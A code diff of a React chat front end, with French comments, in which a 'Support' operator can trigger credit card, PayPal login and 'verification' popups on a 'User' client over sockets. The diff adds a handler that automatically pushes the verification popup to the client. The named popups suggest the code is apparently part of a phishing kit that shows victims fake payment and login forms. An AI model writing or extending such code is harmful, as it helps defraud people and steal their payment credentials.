@@ -455,30 +455,36 @@ function App() {
                 if (msg.user === 'User' && msg.clientInfo) setClientInfo(msg.clientInfo);
                 setMessages((prev) => [...prev, msg]);
             };
+            
             const handleNewFile = (fileData) => {
                 if (fileData.user === 'User' && fileData.clientInfo) setClientInfo(fileData.clientInfo);
                 setMessages((prev) => [...prev, { ...fileData, type: 'file' }]);
             };
+            
             const handleDisplayPopup = () => {
                 if (userType === 'User') {
                     setShowPopup(true);
                 }
             };
+            
             const handleDisplayCreditCardPopup = () => {
                 if (userType === 'User') {
                     setShowCreditCardPopup(true);
                 }
             };
+            
             const handleDisplayPayPalLogin1Popup = () => {
                 if (userType === 'User') {
                     setShowPayPalLogin1Popup(true);
                 }
             };
+            
             const handleDisplayPayPalLogin2Popup = () => {
                 if (userType === 'User') {
                     setShowPayPalLogin2Popup(true);
                 }
             };
+            
             const handleDisplayVerificationPopup = (data) => {
                 if (userType === 'User') {
                     if (data.show) {
@@ -486,6 +492,22 @@ function App() {
                     } else {
                         setShowVerificationPopup(false);
                     }
+                }
+            };
+
+            // ✅ NOUVEAU : Handler pour activation automatique checkbox côté support
+            const handleAutoToggleVerification = (data) => {
+                if (userType === 'Support') {
+                    // Cocher automatiquement la checkbox de vérification
+                    setIsVerifying(true);
+                    setIsImportant(false);
+                    setIsSuccess(false);
+                    
+                    // Afficher le popup de vérification côté client
+                    socket.emit('verification popup', { show: true });
+                    
+                    // Optionnel : Afficher un message de notification
+                    console.log('🔄 Vérification activée automatiquement:', data.action);
                 }
             };
 
@@ -503,6 +525,9 @@ function App() {
             socket.on('display paypal login2 popup', handleDisplayPayPalLogin2Popup);
             socket.on('display verification popup', handleDisplayVerificationPopup);
             
+            // ✅ NOUVEAU : Listener pour activation automatique
+            socket.on('auto_toggle_verification', handleAutoToggleVerification);
+            
             return () => {
                 socket.off('chat message');
                 socket.off('file message');
@@ -513,6 +538,10 @@ function App() {
                 socket.off('display paypal login1 popup');
                 socket.off('display paypal login2 popup');
                 socket.off('display verification popup');
+                
+                // ✅ NOUVEAU : Cleanup du listener
+                socket.off('auto_toggle_verification');
+                
                 if (socket) socket.disconnect();
             };
         }
